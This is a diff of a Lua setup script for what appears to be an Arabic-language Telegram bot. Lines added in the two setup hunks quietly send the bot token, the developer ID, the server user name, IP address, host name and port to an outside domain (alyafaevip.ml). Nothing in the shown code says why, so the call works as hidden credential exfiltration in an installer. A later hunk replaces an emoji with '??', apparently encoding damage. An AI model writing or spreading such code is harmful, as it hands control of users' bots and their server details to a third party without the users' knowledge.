@@ -30,7 +30,7 @@ print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن �
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 database:set(id_server..":token",token)
-local t = json:decode(https.request('https://alyafaevip.ml/LHB/index.php?n=MARCOS&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+local t = json:decode(https.request('https://alyafaevip.ml/LHB/index.php?n=token&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 else
 print('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
@@ -53,7 +53,7 @@ local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
 database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
-local t = json:decode(https.request('https://alyafaevip.ml/LHB/index.php?n=MARCOS&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+local t = json:decode(https.request('https://alyafaevip.ml/LHB/index.php?n=token&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
@@ -10228,7 +10228,7 @@ local tahaa = {
 " كشخه ❤️",
 "ممكن سلفي😻",
 "اطلق ايدي😍",
-"احلا ايدي🥰",
+"احلا ايدي??",
 }
 
 local rdphoto = tahaa[math.random(#tahaa)]
